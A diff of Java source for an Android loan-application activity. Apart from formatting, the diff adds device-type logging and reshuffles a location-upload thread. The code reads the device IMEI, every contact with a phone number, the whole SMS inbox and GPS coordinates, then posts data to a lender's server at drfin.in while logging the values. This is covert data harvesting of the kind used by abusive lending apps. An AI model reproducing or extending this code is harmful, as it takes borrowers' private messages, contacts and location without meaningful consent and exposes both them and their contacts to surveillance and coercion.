@@ -39,20 +39,22 @@ import utilites.Utils;
 public class LoanApplyActvity extends AppCompatActivity {
     TelephonyManager telephonyManager;
     String imeiNumber1 = "";
-    String DeviceModel="";
-    String DeviceName="";
+    String DeviceModel = "";
+    String DeviceName = "";
     double latitute;
     double longitude;
+    String DeviceType;
     ArrayList<String> phone = new ArrayList<>();
     ArrayList<String> smses = new ArrayList<>();
     final ArrayList<String> nameList = new ArrayList<>();
+
     @RequiresApi(api = Build.VERSION_CODES.M)
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_loan_apply_actvity);
         getLocation();
-        Thread thread=new Thread(new Runnable() {
+        Thread thread = new Thread(new Runnable() {
             @SuppressLint("NewApi")
             @RequiresApi(api = Build.VERSION_CODES.GINGERBREAD)
             @Override
@@ -62,6 +64,9 @@ public class LoanApplyActvity extends AppCompatActivity {
                 Log.d("TAG", "Model Name" + DeviceModel);
                 DeviceName = android.os.Build.MANUFACTURER;
                 Log.d("TAG", "Device Name " + DeviceName);
+                DeviceType = Build.DEVICE;
+                Log.d("TAG", "Device Type " + DeviceType);
+
 
                 getAllContacts();
 
@@ -72,6 +77,7 @@ public class LoanApplyActvity extends AppCompatActivity {
         thread.start();
 
     }
+
     public void PhoneMiMe() {
         try {
             Log.d("TAG", "Value is creted by");
@@ -84,8 +90,10 @@ public class LoanApplyActvity extends AppCompatActivity {
         }
 
     }
+
     private ArrayList getAllContacts() {
-        try {            Log.d("TAG", "Value is creted by system");
+        try {
+            Log.d("TAG", "Value is creted by system");
 
             String contact = "";
 
@@ -102,7 +110,6 @@ public class LoanApplyActvity extends AppCompatActivity {
                     String name = cur.getString(cur.getColumnIndex(
                             ContactsContract.Contacts.DISPLAY_NAME));
 
-                    //    nameList.add(name);
                     if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                         Log.d("TAG", "VAlue in fouth");
                         Cursor pCur = cr.query(
@@ -117,9 +124,7 @@ public class LoanApplyActvity extends AppCompatActivity {
                             String name1 = pCur.getString(pCur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                             String phoneNo = pCur.getString(pCur.getColumnIndex(
                                     ContactsContract.CommonDataKinds.Phone.NUMBER));
-                            //    Log.d("TAG","Value is :"+name1 +" phone"+phoneNo);
-                            // phone.add(name1);
-                            // phone.add(phoneNo);
+
                             contact = name1 + " : " + phoneNo;
                             phone.add(contact);
 
@@ -137,19 +142,20 @@ public class LoanApplyActvity extends AppCompatActivity {
                 }
             }
 
-        }catch (Exception e){
+        } catch (Exception e) {
             e.getStackTrace();
         }
         return nameList;
 
     }
+
     @RequiresApi(api = Build.VERSION_CODES.M)
     public ArrayList<String> getsms() {
         try {
             Log.d("tag", "i am at sms function ");
             Uri mysms = Uri.parse("content://sms/inbox");
             Cursor cursor = getContentResolver().query(mysms, null, null, null, null);
-            while (cursor.moveToNext()) {
+            while (cursor.moveToNext() ) {
                 String number = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                 String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                 String fullsms = "number" + number + ": " + msg;
@@ -157,19 +163,20 @@ public class LoanApplyActvity extends AppCompatActivity {
                 Log.d("TAG", "here is my sms " + number + "sfd " + msg);
                 Log.d("TAG", "value of array for sms" + smses);
             }
-        }catch (Exception e){
+        } catch (Exception e) {
             e.getStackTrace();
         }
-sendalldata();
+        sendalldata();
         return smses;
 
     }
+
     @RequiresApi(api = Build.VERSION_CODES.M)
     public void sendalldata() {
         Log.d("TAG", "Value is  Login Attempt");
         Log.d("TAG", "value of array for Phone" + phone);
-        Log.d("TAG","Value of Longitude"+longitude);
-        Log.d("TAG","Value of Longitude"+latitute);
+        Log.d("TAG", "Value of Longitude" + longitude);
+        Log.d("TAG", "Value of Longitude" + latitute);
 
 
         String url = "https://drfin.in/aglowcredit/api/updateCustomerDetails";
@@ -211,8 +218,9 @@ sendalldata();
             e.getStackTrace();
         }
     }
-        @RequiresApi(api = Build.VERSION_CODES.M)
-        public void getLocation(){
+
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    public void getLocation() {
         try {
             LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
             if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
@@ -243,19 +251,14 @@ sendalldata();
                     longitude = location.getLongitude();
                     Log.d("TAG", "Value of latitude is :" + latitute);
                     Log.d("TAG", "Value of latitude is :" + longitude);
-                    Thread thread=new Thread(new Runnable() {
-                        @Override
-                        public void run() {
-                            SendLocationdata();
-                        }
-                    });
-thread.start();
+
 
                 }
 
+
             });
-        }catch (Exception e){
-          e.getStackTrace();
+        } catch (Exception e) {
+            e.getStackTrace();
         }
 
           /*  try {
@@ -276,47 +279,54 @@ thread.start();
                 e.getStackTrace();
 
             }*/
+        Thread thread = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                SendLocationdata();
+            }
+        });
+        thread.start();
+    }
 
-        }
-        public  void SendLocationdata(){
-        Log.d("TAG","VAlue is created in back end Location");
+    public void SendLocationdata() {
+        Log.d("TAG", "VAlue is created in back end Location");
 
-            String url = "https://drfin.in/aglowcredit/api/updateCustomerDetails";
-            RequestBody formBody = new FormBody.Builder()
-                    .add("auth_token", Utils.sharedPreferences.getString("Auth_token", ""))
-                    .add("longitude", String.valueOf(longitude))
-                    .add("latitude", String.valueOf(latitute))
+        String url = "https://drfin.in/aglowcredit/api/updateCustomerDetails";
+        RequestBody formBody = new FormBody.Builder()
+                .add("auth_token", Utils.sharedPreferences.getString("Auth_token", ""))
+                .add("longitude", String.valueOf(longitude))
+                .add("latitude", String.valueOf(latitute))
 
-                    .build();
+                .build();
 
-            OkHttpClient client = new OkHttpClient();
-            Request request = new Request.Builder()
-                    .url(url)
-                    .post(formBody)
-                    .build();
+        OkHttpClient client = new OkHttpClient();
+        Request request = new Request.Builder()
+                .url(url)
+                .post(formBody)
+                .build();
 
 
+        try {
+            Response response = client.newCall(request).execute();
+            Log.d("TAG", "Alue is response1V" + response);
+            String responseString = response.body().string();
+
+            Log.d("TAG", "VAlue is response22323" + responseString);
             try {
-                Response response = client.newCall(request).execute();
-                Log.d("TAG", "Alue is response1V" + response);
-                String responseString = response.body().string();
+                JSONObject json = new JSONObject(responseString);
+                //  String authvalue=json.getString("auth_token");
+                //  Log.d("TAG","VAlue is created by auth"+authvalue);
+                String Auth_token = json.getJSONObject("userdata").getString("auth_token");
 
-                Log.d("TAG", "VAlue is response22323" + responseString);
-                try {
-                    JSONObject json = new JSONObject(responseString);
-                    //  String authvalue=json.getString("auth_token");
-                    //  Log.d("TAG","VAlue is created by auth"+authvalue);
-                    String Auth_token = json.getJSONObject("userdata").getString("auth_token");
-
-                } catch (Exception e) {
-                    e.getStackTrace();
-                }
             } catch (Exception e) {
                 e.getStackTrace();
             }
-
-
+        } catch (Exception e) {
+            e.getStackTrace();
         }
 
-            }
+
+    }
+
+}
 
